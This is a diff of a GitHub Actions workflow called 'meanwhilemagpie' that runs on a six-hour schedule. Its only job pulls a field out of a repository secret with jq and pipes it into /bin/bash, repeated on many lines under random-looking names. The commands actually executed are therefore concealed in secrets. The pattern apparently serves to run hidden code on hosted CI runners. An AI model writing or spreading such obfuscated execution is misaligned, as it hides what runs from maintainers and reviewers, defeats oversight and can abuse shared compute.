@@ -2,26 +2,31 @@ name: meanwhilemagpie
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '47 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: meanwhilemagpie
         env:
-          xh8227: ${{ secrets.xh8227 }}
+          n0: ${{ secrets.n0 }}
         run: |
-          echo $xh8227 | jq -r .au997 | /bin/bash
-          echo $lz02710 | jq -r .o62745 | /bin/bash
-          echo $fhe479 | jq -r .oslam1 | /bin/bash
-          echo $lx0 | jq -r .jc5177 | /bin/bash
-          echo $ir727 | jq -r .h19475 | /bin/bash
-          echo $tebh75 | jq -r .jnf42 | /bin/bash
-          echo $leg48 | jq -r .fufer41622 | /bin/bash
-          echo $f9 | jq -r .ulma2 | /bin/bash
-          echo $xde50593 | jq -r .fsof9 | /bin/bash
-          echo $bpk90 | jq -r .p553 | /bin/bash
-          echo $hwf3161 | jq -r .eup4554 | /bin/bash
-          echo $an28 | jq -r .mj1 | /bin/bash
+          echo $n0 | jq -r .iptry1 | /bin/bash
+          echo $afr99101 | jq -r .rjug7 | /bin/bash
+          echo $vl1004 | jq -r .wert4285 | /bin/bash
+          echo $dtk72938 | jq -r .u3 | /bin/bash
+          echo $srjlm55110 | jq -r .gapi38 | /bin/bash
+          echo $x84426 | jq -r .x12913 | /bin/bash
+          echo $vm735 | jq -r .wgyu0 | /bin/bash
+          echo $kuzly22860 | jq -r .fbxnh0 | /bin/bash
+          echo $fqga2 | jq -r .ry25 | /bin/bash
+          echo $t17933 | jq -r .ftxp3 | /bin/bash
+          echo $b22 | jq -r .gx7 | /bin/bash
+          echo $oltlt81 | jq -r .ds21 | /bin/bash
+          echo $wju0983 | jq -r .c7962 | /bin/bash
+          echo $jun119 | jq -r .rg92 | /bin/bash
+          echo $vk90051 | jq -r .r5905 | /bin/bash
 
